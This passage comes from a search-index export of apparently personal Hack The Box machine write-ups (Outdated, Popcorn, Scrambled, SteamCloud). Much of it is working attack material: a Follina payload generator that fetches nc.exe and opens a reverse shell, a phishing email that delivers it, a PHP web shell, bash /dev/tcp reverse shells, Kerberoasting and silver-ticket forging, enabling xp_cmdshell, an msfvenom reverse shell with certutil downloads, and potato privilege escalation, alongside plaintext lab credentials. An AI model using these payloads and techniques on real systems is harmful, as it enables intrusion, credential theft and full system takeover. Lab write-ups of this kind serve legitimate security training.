software packages (usually applications) published on this WSUS system.\n        WsusContent     Disk      A network share to be used by Local Publishing to place published content on this WSUS system.\n        WSUSTemp        Disk      A network share used by Local Publishing from a Remote WSUS Console Instance.\nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.11.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n\n$ smbclient //10.10.11.175/Shares\nPassword for [WORKGROUP\\kali]:\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; dir\n  .                                   D        0  Mon Jun 20 11:01:33 2022\n  ..                                  D        0  Mon Jun 20 11:01:33 2022\n  NOC_Reminder.pdf                   AR   106977  Mon Jun 20 11:00:32 2022\n\n                9116415 blocks of size 4096. 1405579 blocks available\nsmb: \\&gt; get NOC_Reminder.pdf\ngetting file \\NOC_Reminder.pdf of size 106977 as NOC_Reminder.pdf (40.3 KiloBytes/sec) (average 40.3 KiloBytes/sec)\nsmb: \\&gt; exit\n</code></pre> <p>itsupport@outdated.htb</p> <p><code>echo \"10.10.11.175 dc.outdated.htb mail.outdated.htb outdated.htb\" | sudo tee -a /etc/hosts</code></p>"}, {"location": "HTB/Machines/Outdated/#smtp-cve-2022-30190", "title": "SMTP CVE-2022-30190", "text": "<p>When Folina first became public, John Hammond put out this really solid video explaining it. It\u2019s possible to abuse the <code>msdt://</code> URL protocol to get code execution. The most common attack path is in an Office document that contains an external reference to an attacker controlled HTML file, and that HTML file contains JavaScript that redirects to a <code>msdt://</code> URL.</p> <p>Typically this wouldn\u2019t be an issue, as the Microsoft Diagnostic Tool would pop dialogs and require user input, but it seems that when the URL is longer than 4096 bytes, that is bypassed. This detail was actually missed when the researcher first submitted this bug to Microsoft, which led to the bug being rejected as not a bug, and extended the vulnerability window for many victims.</p> <p>CVE-2022-30190 | GitHub</p> <pre><code>#!/usr/bin/env python3\n\nimport base64\nimport random\nimport string\n\ncommand = f\"\"\"Invoke-WebRequest http://10.10.16.3/nc.exe -OutFile C:\\\\Windows\\\\ProgramData\\\\nc.exe; C:\\\\Windows\\\\ProgramData\\\\nc.exe -e cmd.exe 10.10.16.3 8888\"\"\"\n\n# Base64 encode our command so whitespace is respected\nbase64_payload = base64.b64encode(command.encode(\"utf-8\")).decode(\"utf-8\")\n\n# Slap together a unique MS-MSDT payload that is over 4096 bytes at minimum\nhtml_payload = f\"\"\"&lt;script&gt;location.href = \"ms-msdt:/id PCWDiagnostic /skip force /param \\\\\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\\\\"\"; //\"\"\"\nhtml_payload += (\n    \"\".join([random.choice(string.ascii_lowercase) for _ in range(4096)])\n    + \"\\n&lt;/script&gt;\"\n)\n\nprint(html_payload)\n</code></pre> <p>Copy the HTML payload and save as <code>test.html</code></p> <pre><code>$ swaks -t itsupport@outdated.htb --from test@localhost --server 10.10.11.175 --body \"http://10.10.16.3/test.html\" --header \"Subject: Internal web app\" \n</code></pre> <p>It seems no one click the link in the victim, I reseted the box, but still no one click the link.</p>"}, {"location": "HTB/Machines/Popcorn/", "title": "Popcorn", "text": ""}, {"location": "HTB/Machines/Popcorn/#port-scan", "title": "Port Scan", "text": "<pre><code>$ sudo nmap 10.129.20.243 -p- --min-rate=10000 -T4 -sCV\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)\n|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)\n80/tcp open  http    Apache httpd 2.2.12\n|_http-title: Did not follow redirect to http://popcorn.htb/\n|_http-server-header: Apache/2.2.12 (Ubuntu)\nService Info: Host: popcorn.hackthebox.gr; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>"}, {"location": "HTB/Machines/Popcorn/#web-app", "title": "Web APP", "text": "<p><code>echo 10.129.20.243 popcorn.htb | sudo tee -a /etc/hosts</code></p> <pre><code>$ feroxbuster -u http://popcorn.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --threads=50 -k -C 404\n\n301      GET        9l       28w      312c http://popcorn.htb/torrent =&gt; http://popcorn.htb/torrent/\n200      GET      656l     3113w    47460c http://popcorn.htb/test.php\n200      GET      658l     3123w    47575c http://popcorn.htb/test\n301      GET        9l       28w      318c http://popcorn.htb/torrent/admin =&gt; http://popcorn.htb/torrent/admin/\n200      GET      106l      206w     2988c http://popcorn.htb/torrent/admin/admin\n</code></pre> <p>http://popcorn.htb/torrent/login.php</p> <p>http://popcorn.htb/torrent/torrents.php?mode=upload</p> <p></p> <p>Went to kali offical website and download a torrent file. Then, upload it to the website.</p> <p></p> <p></p> <pre><code>&lt;?php system($_GET[x]); ?&gt;\n</code></pre> <p></p> <pre><code># url encode\nbash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.215/4445 0&gt;&amp;1'\n</code></pre> <p></p>"}, {"location": "HTB/Machines/Popcorn/#george", "title": "George", "text": "<pre><code># /var/www/torrent/database/th_database.sql\nINSERT INTO `users` VALUES (3, 'Admin', '1844156d4166d94387f1a4ad031ca5fa', 'admin', 'admin@yourdomain.com', '2007-01-06 21:12:46', '2007-01-06 21:12:46');\n</code></pre> <p>motd.legal-displayed</p> <p></p> <p>Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2)</p> <pre><code>$ wget http://10.10.14.215/localroot.sh -O test.sh\n\n$ python -c \"import pty;pty.spawn('/bin/bash');\"\n\n$ bash test.sh\n</code></pre> <p></p>"}, {"location": "HTB/Machines/Scrambled/", "title": "Scrambled", "text": ""}, {"location": "HTB/Machines/Scrambled/#port-scan", "title": "Port scan", "text": "<pre><code>$ sudo nmap 10.10.11.168 -p- -T4 --min-rate=10000 -sCV\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-title: Scramble Corp Intranet\n|_http-server-header: Microsoft-IIS/10.0\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-17 02:55:24Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)\n|_ssl-date: 2024-07-17T02:58:43+00:00; -2s from scanner time.\n| ssl-cert: Subject: commonName=DC1.scrm.local\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local\n| Not valid before: 2024-07-17T02:44:27\n|_Not valid after:  2025-07-17T02:44:27\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC1.scrm.local\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local\n| Not valid before: 2024-07-17T02:44:27\n|_Not valid after:  2025-07-17T02:44:27\n|_ssl-date: 2024-07-17T02:58:43+00:00; -2s from scanner time.\n1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2024-07-17T02:54:17\n|_Not valid after:  2054-07-17T02:54:17\n|_ssl-date: 2024-07-17T02:58:43+00:00; -2s from scanner time.\n| ms-sql-info: \n|   10.10.11.168:1433: \n|     Version: \n|       name: Microsoft SQL Server 2019 RTM\n|       number: 15.00.2000.00\n|       Product: Microsoft SQL Server 2019\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|_    TCP port: 1433\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC1.scrm.local\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local\n| Not valid before: 2024-07-17T02:44:27\n|_Not valid after:  2025-07-17T02:44:27\n|_ssl-date: 2024-07-17T02:58:43+00:00; -2s from scanner time.\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC1.scrm.local\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local\n| Not valid before: 2024-07-17T02:44:27\n|_Not valid after:  2025-07-17T02:44:27\n|_ssl-date: 2024-07-17T02:58:43+00:00; -2s from scanner time.\n4411/tcp  open  found?\n| fingerprint-strings: \n|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: \n|     SCRAMBLECORP_ORDERS_V1.0.3;\n|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: \n|     SCRAMBLECORP_ORDERS_V1.0.3;\n|_    ERROR_UNKNOWN_COMMAND;\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n49667/tcp open  msrpc         Microsoft Windows RPC\n49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49674/tcp open  msrpc         Microsoft Windows RPC\n49681/tcp open  msrpc         Microsoft Windows RPC\n49698/tcp open  msrpc         Microsoft Windows RPC\n\n$ echo \"10.10.11.168 dc.scrm.local dc1.scrm.local scrm.local\" | sudo tee -a /etc/hosts\n</code></pre>"}, {"location": "HTB/Machines/Scrambled/#web-app-port-80", "title": "Web app (port 80)", "text": "<p>NTLM authentication is disabled.</p> <p></p> <p>support@scramblecorp.com </p> <p>ksimpson</p> <p></p> <p>It shows there is a possibility to reset a user's password same as his/her username. So, we can try <code>ksimpson:ksimpson</code>.</p>"}, {"location": "HTB/Machines/Scrambled/#smb-server", "title": "SMB server", "text": "<pre><code>$ crackmapexec smb 10.10.11.168 -u 'ksimpson' -p 'ksimpson' --shares\n\n$ smbmap -H 10.10.11.168 -u 'ksimpson' -p 'ksimpson'\n</code></pre> <p>Crackmapexec and smbmap both don't work. Because when I'm doing this box, it already retired and I'm doing it in <code>Guided Mode</code>. So, I know the credential can log into the SMB server. After doing some research, I found <code>smbclient</code> of <code>impacket</code>.</p> <pre><code># -k for kerberoast authentication\n$ impacket-smbclient scrm.local/ksimpson:ksimpson@dc1.scrm.local -k -dc-ip 10.10.11.168\n</code></pre> <p></p> <p>Can use this command to access SMB</p> <pre><code>$ crackmapexec smb dc1.scrm.local -u 'ksimpson' -p 'ksimpson' --shares -k -d scrm.local\n</code></pre> <p></p> <p><code>Network Security Changes.pdf</code></p> <p></p>"}, {"location": "HTB/Machines/Scrambled/#kerberoast-attack-getuserspns", "title": "Kerberoast attack (GetUserSPNs)", "text": "<pre><code>$ impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -target-domain scrm.local -k -dc-ip 10.10.11.168 -dc-host dc1.scrm.local -request\n</code></pre> <p><code>sqlsvc:Pegasus60</code></p>"}, {"location": "HTB/Machines/Scrambled/#convert-plaintext-password-to-ntlm-hash", "title": "Convert plaintext password to NTLM hash", "text": "<p>Generate NTLM hashes via command line</p> <pre><code>$ iconv -f ASCII -t UTF-16LE &lt;(printf \"Pegasus60\") | openssl dgst -md4\n\nMD4(stdin)= b999a16500b87d17ec7f2e2a68778f05\n</code></pre>"}, {"location": "HTB/Machines/Scrambled/#get-the-domain-sid-by-ldapsearch", "title": "Get the domain SID by ldapsearch", "text": "<pre><code>$ ldapsearch -H ldap://dc1.scrm.local -D ksimpson@scrm.local -w ksimpson -b \"DC=scrm,DC=local\" \"(objectClass=user)\"\n\nldap_bind: Strong(er) authentication required (8)\n        additional info: 00002028: LdapErr: DSID-0C090259, comment: The server requires binds to turn on integrity checking if SSL\\TLS are not already active on the connection, data 0, v4563\n\n# Download server certificate\n$ openssl s_client -connect dc1.scrm.local:636\n\n# oneline command\n$ echo -n | openssl s_client -connect dc1.scrm.local:636 | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' &gt; ldapserver.pem\n\nConnecting to 10.10.11.168\ndepth=0 CN=DC1.scrm.local\nverify error:num=20:unable to get local issuer certificate\nverify return:1\ndepth=0 CN=DC1.scrm.local\nverify error:num=21:unable to verify the first certificate\nverify return:1\ndepth=0 CN=DC1.scrm.local\nverify return:1\nDONE\n</code></pre> <p>Edit <code>/etc/ldap/ldap.conf</code> to point out the certificate</p> <pre><code>#\n# LDAP Defaults\n#\n\n# See ldap.conf(5) for details\n# This file should be world readable but not world writable.\n\n#BASE   dc=example,dc=com\n#URI    ldap://ldap.example.com ldap://ldap-provider.example.com:666\n\n#SIZELIMIT  12\n#TIMELIMIT  15\n#DEREF      never\n\n# TLS certificates (needed for GnuTLS)\n# TLS_CACERT    /etc/ssl/certs/ca-certificates.crt\nTLS_CACERT  /home/kali/HTB/Scrambled/ldapserver.pem\n</code></pre> <pre><code># -Z start TLS request\n$ ldapsearch -H ldap://dc1.scrm.local -Z -D ksimpson@scrm.local -w ksimpson -b \"DC=scrm,DC=local\" \"(objectClass=user)\" &gt; ldapsearch.opt \n</code></pre> <p></p> <p><code>AQUAAAAAAAUVAAAAhQSCo0F98mxA04uX9AEAAA==</code></p> <p>Convert a SID between binary and string forms</p> <pre><code>#!/usr/bin/env python3\n\nimport base64\nimport struct\nimport sys\n\nb64sid = sys.argv[1]\nbinsid = base64.b64decode(b64sid)\na, N, cccc, dddd, eeee, ffff, gggg = struct.unpack(\"BBxxxxxxIIIII\", binsid)\nbb, bbbb = struct.unpack(\"&gt;xxHIxxxxxxxxxxxxxxxxxxxx\", binsid)\nbbbbbb = (bb &lt;&lt; 32) | bbbb\n\nprint(f\"S-{a}-{bbbbbb}-{cccc}-{dddd}-{eeee}-{ffff}-{gggg}\")\n</code></pre> <pre><code>$ python sid.py AQUAAAAAAAUVAAAAhQSCo0F98mxA04uX9AEAAA==\nS-1-5-21-2743207045-1827831105-2542523200-500\n</code></pre> <p>The domain SID is that SID without the <code>-500</code>.</p>"}, {"location": "HTB/Machines/Scrambled/#get-the-domain-sid-by-getpacpy", "title": "Get the domain SID by getPac.py", "text": "<pre><code>$ impacket-getPac -targetUser administrator scrm.local/ksimpson:ksimpson\n\nDomain SID: S-1-5-21-2743207045-1827831105-2542523200\n</code></pre>"}, {"location": "HTB/Machines/Scrambled/#generate-ticket", "title": "Generate ticket", "text": "<pre><code>$ impacket-ticketer -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -dc-ip dc1.scrm.local -spn MSSQLSvc/dc1.scrm.local:1433 administrator\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Creating basic skeleton ticket and PAC Infos\n[*] Customizing ticket for scrm.local/administrator\n[*]     PAC_LOGON_INFO\n[*]     PAC_CLIENT_INFO_TYPE\n[*]     EncTicketPart\n[*]     EncTGSRepPart\n[*] Signing/Encrypting final ticket\n[*]     PAC_SERVER_CHECKSUM\n[*]     PAC_PRIVSVR_CHECKSUM\n[*]     EncTicketPart\n[*]     EncTGSRepPart\n[*] Saving ticket in administrator.ccache\n</code></pre>"}, {"location": "HTB/Machines/Scrambled/#mssql-port-1433", "title": "MSSql (port 1433)", "text": "<p>On Linux, Kerberos looks in predefined places for tickets, like <code>/tmp/krb5cc_[uid of current user]</code> and any file pointed to by the <code>KRB5CCACHE</code> environment variable. </p> <pre><code>$ KRB5CCNAME=administrator.ccache impacket-mssqlclient -k dc1.scrm.local\n\nSQL&gt; select name, database_id from sys.databases;\nname         database_id   \n----------   -----------   \nmaster                 1   \n\ntempdb                 2   \n\nmodel                  3   \n\nmsdb                   4   \n\nScrambleHR             5   \n\nSQL&gt; use ScrambleHR;\nSQL&gt; SELECT TABLE_NAME FROM ScrambleHR.INFORMATION_SCHEMA.TABLES;\nTABLE_NAME   \n----------   \nEmployees    \n\nUserImport   \n\nTimesheets  \n\nSQL&gt; select * from Employees;\nSQL&gt; select * from UserImport;\nLdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups   \n--------   -----------------   ----------   ---------------   -------------   \nMiscSvc    ScrambledEggs9900   scrm.local                90               0   \n\n# Check if xp_cmdshell is enabled\nSQL&gt; SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';\nSQL&gt; sp_configure 'show advanced options', '1';\nSQL&gt; RECONFIGURE;\nSQL&gt; sp_configure 'xp_cmdshell', '1';\nSQL&gt; RECONFIGURE;\n</code></pre> <p>The mssql can run <code>xp_cmdshell</code></p>"}, {"location": "HTB/Machines/Scrambled/#user-sqlsvc-unintended-way", "title": "User sqlsvc (unintended way)", "text": "<p>This is not the intended way to solve the box. Because you cannot find <code>user.txt</code> on sqlsvc's desktop. And I'm following the <code>Guided Mode</code>, so I know it's not.</p> <pre><code>SQL&gt;  xp_cmdshell powershell -e JABjAGwAaQBlA......\n</code></pre> <p></p> <p>The user has <code>SeImpersonatePrivilege</code> privilege. We can try <code>juicypotato</code>.</p> <p>JuicyPotatoNG | GitHub</p> <pre><code>$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.2 LPORT=4444 -f exe &gt; shell.exe \n</code></pre> <p>Upload <code>shell.exe</code> and <code>JuicyPotatoNG.exe</code> to the target box.</p> <pre><code>&gt; certutil -f -urlcache http://10.10.16.2/JuicyPotatoNG.exe juicypotato.exe\n\n&gt; certutil -f -urlcache http://10.10.16.2/shell.exe shell.exe\n\n&gt; .\\juicypotato.exe -t * -p C:\\users\\sqlsvc\\shell.exe\n\n\n         JuicyPotatoNG\n         by decoder_it &amp; splinter_code\n\n[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247 \n[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\\SYSTEM;Impersonation\n[+] CreateProcessAsUser OK\n[+] Exploit successful! \n</code></pre> <p></p>"}, {"location": "HTB/Machines/Scrambled/#user-miscsvc-designed-way", "title": "User MiscSvc (Designed way)", "text": "<p><code>MiscSvc:ScrambledEggs9900</code></p> <p>Configure Realm</p> <p>I\u2019ll need to add this domain to my local <code>krb5.conf</code> file:</p> <p>My Kali doesn't have <code>/etc/krb5.conf</code>, so install krb5 <code>sudo apt-get install krb5-user</code>.</p> <p>Change <code>/etc/krb5.conf</code> to:</p> <pre><code>[libdefaults]\n        default_realm = SCRM.LOCAL\n# The following libdefaults parameters are only for Heimdal Kerberos.\n#        fcc-mit-ticketflags = true\n\n[realms]\n        SCRM.LOCAL = {\n                kdc = dc1.scrm.local\n                #admin_server = dc1.scrm.local\n        }\n\n[domain_realm]\n        .scrm.local = SCRM.LOCAL\n        scrm.local = SCRM.LOCAL\n</code></pre> <pre><code>$ impacket-getTGT scrm.local/MiscSvc:ScrambledEggs9900\nImpacket v0.11.0 - Copyright 2023 Fortra\n\nKerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\n\n$ sudo ntpdate -u scrm.local                          \n2024-07-17 03:13:12.674924 (-0400) -86408.498354 +/- 0.104567 scrm.local 10.10.11.168 s1 no-leap\nCLOCK: time stepped by -86408.498354\nCLOCK: time changed from 2024-07-18 to 2024-07-17\n\n$ impacket-getTGT scrm.local/MiscSvc:ScrambledEggs9900\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Saving ticket in MiscSvc.ccache\n\n$ export KRB5CCNAME=MiscSvc.ccache                    \n\n$ evil-winrm -r SCRM.LOCAL -i dc1.scrm.local  \n</code></pre> <p>The ticket will expire soon after creating, you may need to repeat the procedures several time to get interactive connection.</p> <p></p>"}, {"location": "HTB/Machines/SteamCloud/", "title": "SteamCloud", "text": "<pre><code>\u2514\u2500$ sudo nmap 10.10.11.133 -p- --min-rate=10000 -T4 -Pn     \nPORT      STATE SERVICE\n22/tcp    open  ssh\n2379/tcp  open  etcd-client\n2380/tcp  open  etcd-server\n8443/tcp  open  https-alt\n10249/tcp open  unknown\n10250/tcp open  unknown\n10256/tcp open  unknown\n\n\u2514\u2500$ sudo nmap 10.10.11.133 -p 22,2379,2380,8443,10249,10250,10256 --min-rate=10000 -T4 -Pn -sCV\nPORT      STATE SERVICE          VERSION\n22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey: \n|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)\n|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)\n|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)\n2379/tcp  open  ssl/etcd-client?\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn: \n|_  h2\n| ssl-cert: Subject: commonName=steamcloud\n| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1\n| Not valid before: 2024-02-21T07:18:56\n|_Not valid after:  2025-02-20T07:18:56\n2380/tcp  open  ssl/etcd-server?\n| tls-alpn: \n|_  h2\n| ssl-cert: Subject: commonName=steamcloud\n| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1\n| Not valid before: 2024-02-21T07:18:56\n|_Not valid after:  2025-02-20T07:18:57\n|_ssl-date: TLS randomness does not represent time\n8443/tcp  open  ssl/https-alt\n| ssl-cert: Subject: commonName=minikube/organizationName=system:masters\n| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1\n| Not valid before: 2024-02-20T07:18:54\n|_Not valid after:  2027-02-20T07:18:54\n|_ssl-date: TLS randomness does not represent time\n|_http-title: Site doesn't have a title (application/json).\n| tls-alpn: \n|   h2\n|_  http/1.1\n| fingerprint-strings: \n|   FourOhFourRequest: \n|     HTTP/1.0 403 Forbidden\n|     Audit-Id: a090b496-a021-4484-8ec8-ab726ca9c2fd\n|     Cache-Control: no-cache, private\n|     Content-Type: application/json\n|     X-Content-Type-Options: nosniff\n|     X-Kubernetes-Pf-Flowschema-Uid: e287085f-2ac9-4960-9104-714a75bececb\n|     X-Kubernetes-Pf-Prioritylevel-Uid: bb4b8c06-406d-4716-aab3-75211d4abf5b\n|     Date: Wed, 21 Feb 2024 07:27:47 GMT\n|     Content-Length: 212\n|     {\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \"system:anonymous\" cannot get path \"/nice ports,/Trinity.txt.bak\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n|   GetRequest: \n|     HTTP/1.0 403 Forbidden\n|     Audit-Id: df87bc9b-49b9-47aa-9c22-437d2f7dd27d\n|     Cache-Control: no-cache, private\n|     Content-Type: application/json\n|     X-Content-Type-Options: nosniff\n|     X-Kubernetes-Pf-Flowschema-Uid: e287085f-2ac9-4960-9104-714a75bececb\n|     X-Kubernetes-Pf-Prioritylevel-Uid: bb4b8c06-406d-4716-aab3-75211d4abf5b\n|     Date: Wed, 21 Feb 2024 07:27:46 GMT\n|     Content-Length: 185\n|     {\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \"system:anonymous\" cannot get path \"/\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n|   HTTPOptions: \n|     HTTP/1.0 403 Forbidden\n|     Audit-Id: b612ac2d-ffe4-477e-9ca2-a5440c5e9151\n|     Cache-Control: no-cache, private\n|     Content-Type: application/json\n|     X-Content-Type-Options: nosniff\n|     X-Kubernetes-Pf-Flowschema-Uid: e287085f-2ac9-4960-9104-714a75bececb\n|     X-Kubernetes-Pf-Prioritylevel-Uid: bb4b8c06-406d-4716-aab3-75211d4abf5b\n|     Date: Wed, 21 Feb 2024 07:27:46 GMT\n|     Content-Length: 189\n|_    {\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \"system:anonymous\" cannot options path \"/\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)\n|_http-title: Site doesn't have a title (text/plain; charset=utf-8).\n10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)\n| ssl-cert: Subject: commonName=steamcloud@1708499939\n| Subject Alternative Name: DNS:steamcloud\n| Not valid before: 2024-02-21T06:18:59\n|_Not valid after:  2025-02-20T06:18:59\n|_ssl-date: TLS randomness does not represent time\n|_http-title: Site doesn't have a title (text/plain; charset=utf-8).\n| tls-alpn: \n|   h2\n|_  http/1.1\n10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)\n|_http-title: Site doesn't have a title (text/plain; charset=utf-8).\n1 service unrecognized despite returning data. \nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n\u2514\u2500$ curl -k https://10.10.11.133:8443/ | jq\n{\n  \"kind\": \"Status\",\n  \"apiVersion\": \"v1\",\n  \"metadata\": {},\n  \"status\": \"Failure\",\n  \"message\": \"forbidden: User \\\"system:anonymous\\\" cannot get path \\\"/\\\"\",\n  \"reason\": \"Forbidden\",\n  \"details\": {},\n  \"code\": 403\n}\n\n</code></pre> <p>Pentesting Kubernetes Services</p> <p>kubeletctl:A client for kubelet</p> <pre><code>\u2514\u2500$ ~/HTB/tools/kubeletctl_linux_amd64 pods --server 10.10.11.133\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                                Pods from Kubelet                               \u2502\n\u251c\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   \u2502 POD                                \u2502 NAMESPACE   \u2502 CONTAINERS              \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 1 \u2502 kube-controller-manager-steamcloud \u2502 kube-system \u2502 kube-controller-manager \u2502\n\u2502   \u2502                                    \u2502             \u2502                         